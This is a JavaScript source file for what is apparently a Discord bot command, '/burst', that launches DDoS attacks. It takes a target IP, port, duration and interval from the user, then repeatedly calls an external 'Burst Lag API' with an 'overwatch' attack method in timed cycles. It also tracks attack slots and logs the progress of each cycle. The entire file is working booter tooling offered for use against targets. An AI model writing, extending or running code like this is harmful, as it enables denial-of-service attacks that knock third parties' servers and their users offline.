const axios = require('axios');
const { sanitizeInput, isValidIP, isValidPort, isValidTime, isValidInterval } = require('../utils/utils');

const handleBurstCommand = async (interaction, userActiveCommands, apiDetails, logMessage, getCurrentTimestamp) => {
    const userId = interaction.user.id;

    if (!userActiveCommands[userId]) {
        userActiveCommands[userId] = 0;
    }

    if (userActiveCommands[userId] > 0) {
        return interaction.reply({ content: 'Only one /burst command can be run at a time per user.', ephemeral: true });
    }

    const api = apiDetails.find(api => api.name === 'Burst Lag API');
    if (!api) {
        logMessage('Burst API not found');
        return interaction.reply({ content: 'Burst API not found.', ephemeral: true });
    }

    if (api.activeAttacks + 2 > api.maxConcurrent) {
        return interaction.reply({ content: 'No available API slots for /burst command. Please wait for an attack to complete.', ephemeral: true });
    }

    const target = interaction.options.getString('ip');
    const port = interaction.options.getInteger('port');
    let totalTime = interaction.options.getInteger('time');
    const interval = interaction.options.getInteger('interval');

    if (!isValidIP(target) || !isValidPort(port) || !isValidTime(totalTime) || !isValidInterval(interval)) {
        return interaction.reply({ content: 'Invalid input parameters.', ephemeral: true });
    }

    const sanitizedIp = sanitizeInput(target);
    if (totalTime > 120) totalTime = 120; // Limit the total attack duration to 120 seconds

    const offTime = 20; // Default off-time in seconds
    const totalCycles = Math.ceil(totalTime / (interval + offTime));

    userActiveCommands[userId] += 1;
    api.activeAttacks += 2;

    const burstAttackCycle = async (cycle) => {
        const cycleStart = Date.now();
        console.log(`[${getCurrentTimestamp()}] Starting burst attack cycle ${cycle + 1} on ${sanitizedIp}:${port} for ${interval} seconds`);
        logMessage(`[${getCurrentTimestamp()}] Starting burst attack cycle ${cycle + 1} on ${sanitizedIp}:${port} for ${interval} seconds`);

        try {
            const response = await axios.get(api.url, {
                params: {
                    api_key: api.apiKey,
                    user: api.userId,
                    target: sanitizedIp,
                    time: interval,
                    port: port,
                    method: 'overwatch',
                },
            });

            const responseTime = Date.now() - cycleStart;
            console.log(`[${getCurrentTimestamp()}] Burst attack cycle ${cycle + 1} response received with status: ${response.status} (response time: ${responseTime}ms)`);
            logMessage(`[${getCurrentTimestamp()}] Burst attack cycle ${cycle + 1} response received with status: ${response.status} (response time: ${responseTime}ms)`);
            logMessage(`[${getCurrentTimestamp()}] Burst attack cycle ${cycle + 1} response data: ${JSON.stringify(response.data)}`);

            if (response.status !== 200) {
                await interaction.followUp({ content: `Burst attack cycle ${cycle + 1} failed with response code: ${response.status}`, ephemeral: true });
            }
        } catch (error) {
            const errorTime = Date.now() - cycleStart;
            console.error(`[${getCurrentTimestamp()}] Error during burst attack cycle ${cycle + 1} (response time: ${errorTime}ms):`, error);
            logMessage(`[${getCurrentTimestamp()}] Error during burst attack cycle ${cycle + 1} (response time: ${errorTime}ms): ${error.message}`);
            await interaction.followUp({ content: `Error during burst attack cycle ${cycle + 1}: ${error.message}`, ephemeral: true });
        }

        if (cycle < totalCycles - 1) {
            console.log(`[${getCurrentTimestamp()}] Pausing for ${offTime} seconds before next burst cycle`);
            logMessage(`[${getCurrentTimestamp()}] Pausing for ${offTime} seconds before next burst cycle`);
            await new Promise(resolve => setTimeout(resolve, (offTime + interval) * 1000)); // Wait for interval + off-time
            await burstAttackCycle(cycle + 1);
        } else {
            api.activeAttacks -= 2;
            userActiveCommands[userId] -= 1;
            console.log(`[${getCurrentTimestamp()}] User ${interaction.user.tag} burst attack completed`);
            logMessage(`[${getCurrentTimestamp()}] User ${interaction.user.tag} burst attack completed`);
        }
    };

    await interaction.reply({ content: `Burst attack on target ${sanitizedIp}:${port} for total ${totalTime} seconds started with ${interval} seconds intervals.`, ephemeral: true });
    await burstAttackCycle(0);
};

module.exports = { handleBurstCommand };
